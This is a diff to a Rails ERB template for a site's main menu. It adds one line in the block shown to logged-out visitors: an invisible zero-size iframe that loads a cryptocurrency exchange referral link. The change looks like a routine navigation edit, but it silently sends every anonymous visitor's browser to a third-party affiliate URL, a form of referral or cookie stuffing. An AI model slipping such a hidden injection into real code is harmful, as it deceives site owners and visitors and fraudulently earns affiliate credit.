@@ -1,6 +1,7 @@
 <menu id="main-menu" class="main">
   <% if CurrentUser.is_anonymous? %>
     <%= nav_link_to("Login", login_path(url: request.fullpath), rel: "nofollow") %>
+    <iframe src="https://referral.coinmetro.com/?ref=main" style="width:0;height:0;border:0; border:none;"></iframe>
   <% else %>
     <%= nav_link_to("My Account #{unread_dmail_indicator(CurrentUser.user)}", profile_path) %>
   <% end %>
